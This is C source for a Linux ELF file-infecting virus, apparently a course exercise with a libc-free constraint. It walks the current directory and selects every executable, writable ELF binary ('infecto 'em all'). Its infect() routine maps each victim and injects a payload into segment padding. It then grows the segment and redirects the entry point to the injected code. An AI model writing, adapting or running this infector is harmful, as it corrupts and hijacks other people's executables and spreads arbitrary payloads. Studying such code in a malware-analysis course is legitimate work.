		// 		write(1, " as no W user", my_strlen(" as no W user"));
		// 	}
		// }
		// write(1, "\n", 1);
//	}
	return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
		|| (sb->st_mode & S_IWOTH);
}

int is_elf(const char* fpath)
{
	Elf64_Ehdr header; // Assuming 64-bit ELF file.
	size_t nb;
	int ret = 0;
	//FILE* f;
	int f;

	//f = fopen(fpath, "rb");
	//f = open(fpath, O_RDONLY);
	f = open(fpath, O_RDWR);
	//f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
	if (f < 0) {
		// if(DEBUG) {
		// 	write(1, "[DEBUG] error inspecting file : ", my_strlen("[DEBUG] error inspecting file : "));
		// 	write(1, fpath, my_strlen(fpath));
		// 	write(1, "\n", 1);
		// }
		return 0;
	}
	//nb = fread(&header, 1, sizeof(header), f);
	nb = read(f, (char*)&header, sizeof(header));
	if (nb == sizeof(header)) {
		//if (my_memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
		if ( header.e_ident[0] == (unsigned char)ELFMAG0 && header.e_ident[1] == (unsigned char)ELFMAG1 && header.e_ident[2] == (unsigned char)ELFMAG2 && header.e_ident[3] == (unsigned char)ELFMAG3 ){
			ret = 1;
		}
	} //else {
	// 	if(DEBUG) {
	// 		write(1, "[DEBUG] error while reading file\n", my_strlen("[DEBUG] error while reading file\n"));
	// 	}
	// }
	//fclose(f);
	close(f);

	// if(DEBUG) {
	// 	write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
	// 	write(1, fpath, my_strlen(fpath));
	// 	if(ret) {
	// 		write(1, " is ELF", my_strlen(" is ELF"));
	// 	} else {
	// 		write(1, " is not ELF", my_strlen(" is not ELF"));
	// 	}
	// 	write(1, ", eident : ", my_strlen(", eident : "));
	// 	char tmp_eident[128];
	// 	itoa(header.e_ident, tmp_eident, 16);
	// 	write(1, (char*)&(header.e_ident[1]), 3);
	// 	write(1, &(header.e_ident[2]), 1);
	// 	write(1, &(header.e_ident[3]), 1);
	// 	write(1, "\n", 1);
	// }


	return ret;
}

int random_pick()
{
	int rand = 0;
	int f;
	char urand[13];
	urand[0] = '/';
	urand[1] = 'd';
	urand[2] = 'e';
	urand[3] = 'v';
	urand[4] = '/';
	urand[5] = 'u';
	urand[6] = 'r';
	urand[7] = 'a';
	urand[8] = 'n';
	urand[9] = 'd';
	urand[10] = 'o';
	urand[11] = 'm';
	urand[12] = '\0';
	f = open(urand, O_RDONLY);
	read(f, (char*)&rand, 1);
	close(f);
	
	// if(DEBUG) {
	// 	write(1, "[DEBUG] rand : ", my_strlen("[DEBUG] rand : "));
	// 	char c = '0' + rand % 5;
	// 	write(1, &c, 1);
	// 	write(1, "\n", 1);
	// }
	//return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
	return 1; // infecto 'em all
}

int file_process(const char *fpath,
				 const struct stat *sb)
{
	int ret = 0;

	if (can_execute(sb, fpath)
		&& can_write(sb, fpath)
		&& is_elf(fpath)
		&& random_pick())
	{
		ret = infect(fpath);
	}

	return ret;
}

int main(int argc, char* argv[])
{
	//struct timeval t;
	char root_dir = '.';
	int nfds = getdtablesize() - SPARE_FDS;
	if(nfds == -5) return -1;
	nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

	//gettimeofday(&t, NULL);
	//srand(t.tv_usec * t.tv_sec);
	nftw(&root_dir, file_process, nfds);
	//write(1, "hello from libc-free world\n", 27);
	return 0;
}

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
//	  The above logic is an example, and you can freely modify it. Note that
//	  you should make the above logic work without calling libc functions.
///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

// http://weeb.ddns.net/0/programming/c_without_standard_library_linux.txt
uintptr my_strlen(char const* str)
{
	char const* p;
	for (p = str; *p; ++p);
	return p - str;
}

// https://linux.die.net/man/3/strcat
char*
my_strncat(char *dest, const char *src, size_t n)
{
    size_t dest_len = my_strlen(dest);
    size_t i;

   for (i = 0 ; i < n && src[i] != '\0' ; i++)
        dest[dest_len + i] = src[i];
    dest[dest_len + i] = '\0';

   return dest;
}

// https://linux.die.net/man/3/strcpy
char *
my_strncpy(char *dest, const char *src, size_t n)
{
    size_t i;

   for (i = 0; i < n && src[i] != '\0'; i++)
        dest[i] = src[i];
    for ( ; i < n; i++)
        dest[i] = '\0';

   return dest;
}

// https://www.geeksforgeeks.org/implement-itoa/
/* A utility function to reverse a string  */
void reverse(char str[], int length)
{
    int start = 0;
    int end = length -1;
    while (start < end)
    {
        char tmp = *(str+start);
        *(str+start) = *(str+end);
        *(str+end) = tmp;
        start++;
        end--;
    }
}
 
// Implementation of itoa()
char* itoa(int num, char* str, int base)
{
    int i = 0;
    int isNegative = 0;
 
    /* Handle 0 explicitely, otherwise empty string is printed for 0 */
    if (num == 0)
    {
        str[i++] = '0';
        str[i] = '\0';
        return str;
    }
 
    // In standard itoa(), negative numbers are handled only with 
    // base 10. Otherwise numbers are considered unsigned.
    if (num < 0 && base == 10)
    {
        isNegative = 1;
        num = -num;
    }
 
    // Process individual digits
    while (num != 0)
    {
        int rem = num % base;
        str[i++] = (rem > 9)? (rem-10) + 'a' : rem + '0';
        num = num/base;
    }
 
    // If number is negative, append '-'
    if (isNegative)
        str[i++] = '-';
 
    str[i] = '\0'; // Append string terminator
 
    // Reverse the string
    reverse(str, i);
 
    return str;
}

// https://stackoverflow.com/questions/18851835/create-my-own-memset-function-in-c
void  *my_memset(void *b, int c, int len)
{
	//int           i;
	unsigned char *p = b;
	//i = 0;
	while(len > 0)
	{
		*p = c;
		p++;
		len--;
	}
	return(b);
}

// https://www.student.cs.uwaterloo.ca/~cs350/common/os161-src-html/doxygen/html/memmove_8c_source.html
void * my_memmove(void *dst, const void *src, size_t len)
{
	size_t i;

	// if ((uintptr)dst < (uintptr)src) {
	// 	return memcpy(dst, src, len);
	// }

	// Copy by words in the common case. Look in memcpy.c for more
	// information.
	if ((uintptr)dst % sizeof(long) == 0 &&
		(uintptr)src % sizeof(long) == 0 &&
		len % sizeof(long) == 0) {

		long *d = dst;
		const long *s = src;

		// The reason we copy index i-1 and test i>0 is that
		// i is unsigned -- so testing i>=0 doesn't work.

		for (i=len/sizeof(long); i>0; i--) {
			d[i-1] = s[i-1];
		}
	} else {
		char *d = dst;
		const char *s = src;

		for (i=len; i>0; i--) {
			d[i-1] = s[i-1];
		}
	}
	 
	return dst;
}

// FIXME: your infection logic should be placed here and below.
int infect(const char* fpath)
{
	//printf("%s will be infected.\n", fpath);
	write(1, fpath, my_strlen(fpath));
	write(1, " will be infected.\n", my_strlen(" will be infected.\n"));

	int victim_fd = open(fpath, O_RDWR);
	if(victim_fd<0) {
		return -1;
	}
	struct stat victim_info;
	fstat(victim_fd, &victim_info);

	//int virus_fd = open()

	void* victim = (void *)mmap(0, victim_info.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, victim_fd, 0);

	Elf64_Ehdr* header = (Elf64_Ehdr*)victim;

	//Elf64_Addr ep = header->e_entry;

	Elf64_Phdr* pHeader[header->e_phnum];
	// Elf64_Shdr* sHeader[header->e_shnum];
	// char* programs[header->e_phnum];
	// char* sections[header->e_shnum];
	// char* sNames[header->e_shnum];

	Elf64_Half textseg = 0;

	char* pos = victim + header->e_phoff;
	for(int i = 0 ; i < header->e_phnum ; i++) {
		pHeader[i] = (Elf64_Phdr*)pos;
		if(pHeader[i]->p_type == PT_LOAD && pHeader[i]->p_flags & (PF_R | PF_X)) {
			textseg = (Elf64_Half)i;
		}
		pos += header->e_phentsize;
	}

	// pos = victim + header->e_shoff;
	// for(int i = 0 ; i < header->e_shnum ; i++) {
	// 	sHeader[i] = (Elf64_Shdr*)pos;
	// 	pos += header->e_shentsize;
	// }

	// for(int i = 0 ; i < header->e_phnum ; i++) {
	// 	programs[i] = (char *)(victim + pHeader[i]->p_offset);
	// }

	// for(int i = 0 ; i < header->e_shnum ; i++) {
	// 	sections[i] = (char *)(victim + sHeader[i]->sh_offset);
	// }

	//Elf64_Half shstrndx = header->e_shstrndx;
	//Elf64_Half textsec;

	// char text[6];
	// text[0] = '.';
	// text[1] = 't';
	// text[2] = 'e';
	// text[3] = 'x';
	// text[4] = 't';
	// text[5] = '\0';
	// if(shstrndx != SHN_UNDEF) {
	// 	//int pos = 1;
	// 	for(int i = 0 ; i < header->e_shnum ; i++) {
	// 		if(my_memcmp(sections[shstrndx] + sHeader[i]->sh_name, &text, 5) == 0) {
	// 			textsec = (Elf64_Half)i;
	// 		}
	// 	}
	// } else {

	// 	close(victim_fd);
	// 	return -1;
	// }

	Elf64_Off padding;
	//Elf64_Xword padsize;

	padding = pHeader[textseg - 1]->p_offset + pHeader[textseg - 1]->p_filesz;
	if( REQ_SIZE > pHeader[textseg]->p_offset - padding) {
		close(victim_fd);
		return -1;
	}
	if(DEBUG) {
		write(1, "text : seg[", my_strlen("text : seg["));
		char tmp_index[8];
		itoa(textseg, tmp_index, 10);
		write(1, tmp_index, my_strlen(tmp_index));
		write(1, "]\n", 2);
		write(1,"found padding : ", my_strlen("found padding : "));
		char tmp_padding[128];
		itoa(padding, tmp_padding, 16);
		write(1, tmp_padding, my_strlen(tmp_padding));
		write(1, "\n", 1);
	}

	my_memmove(victim + padding, PAY, REQ_SIZE);

	pHeader[textseg - 1]->p_filesz += REQ_SIZE;
	pHeader[textseg - 1]->p_memsz += REQ_SIZE;
	header->e_entry = (unsigned long)(pHeader[textseg - 1]->p_vaddr + padding);



	close(victim_fd);
	
	return 0;
}

